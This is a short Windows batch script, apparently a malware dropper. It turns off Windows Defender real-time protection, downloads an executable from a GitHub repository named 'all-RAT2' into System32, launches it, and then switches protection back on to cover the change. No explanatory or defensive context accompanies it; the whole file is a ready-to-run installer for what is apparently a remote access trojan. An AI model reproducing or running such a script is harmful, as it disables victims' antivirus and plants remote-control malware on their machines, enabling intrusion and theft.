@echo off

Powershell.exe -command Set-MpPreference -DisableRealtimeMonitoring 1
Powershell.exe -command wget "https://github.com/lino-build/all-RAT2/raw/main/Client.exe" -OutFile "C:\WINDOWS\system32\Client.exe"
start C:\Windows\System32\Client.exe
Powershell.exe -command Set-MpPreference -DisableRealtimeMonitoring 0
exit